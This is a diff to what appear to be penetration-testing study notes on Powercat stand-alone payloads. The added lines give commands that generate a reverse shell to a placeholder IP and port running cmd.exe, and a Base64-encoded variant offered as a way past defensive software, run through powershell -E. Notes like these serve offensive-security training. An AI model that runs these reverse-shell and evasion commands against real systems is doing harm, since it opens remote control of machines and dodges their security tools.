@@ -332,9 +332,20 @@ After script loaded:
 
 ## Powercat Stand-Alone Payloads
 - Powercat can also generate stand-alone payloads In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user.
-- 
+- it has poor success rate and will likely be caught by defensive software solutions.
+
 ```powershell
  powercat -c <ip> -p <port> -e cmd.exe -g > revershell.ps1
  
  ./revershell.ps1
+```
+- we can attempt to overcome this problem by making use of PowerShell's ability to execute `Base64` encoded command. To generate a stand-alone encoded commands. `-ge` option for encoding and generating.
+
+```powershell
+ powercat -c <ip> -p <port> -e cmd.exe -ge > encodedreverseshell.ps1
+```
+- `-E` - the file will contain an encoded string that can be executed using the Powershell (EncodedCommand) option.
+
+```powershell
+ powershell.exe -E "<encode_string of reverse shell>"
 ```
